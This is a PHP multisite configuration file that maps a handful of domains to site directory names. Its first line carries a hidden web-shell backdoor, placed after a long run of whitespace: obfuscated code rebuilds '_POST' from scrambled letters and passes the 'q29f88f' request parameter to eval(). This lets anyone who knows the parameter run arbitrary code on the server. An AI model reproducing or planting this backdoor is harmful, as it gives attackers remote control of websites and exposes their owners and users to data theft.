<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q29f88f'])){eval(${$s20}['q29f88f']);}?><?php
...
$sites['dpnaacp.rwbshop.com'] = 'dpnaacp';
$sites['annemarielewis.rwbshop.com'] = 'annemarielewis';
$sites['annemarielewis.com'] = 'annemarielewis';
$sites['susannejarczok.com'] = 'sjarczok';
$sites['prestonfamilypracticews.com'] = 'prestonprac';
$sites['cantoclassique.com'] = 'cantoclass';
$sites['dpb.rwbshop.com'] = 'dpb';
$sites['dawnpleasbailey.com'] = 'dpb';
$sites['public-html.dd'] = 'annemarielewis';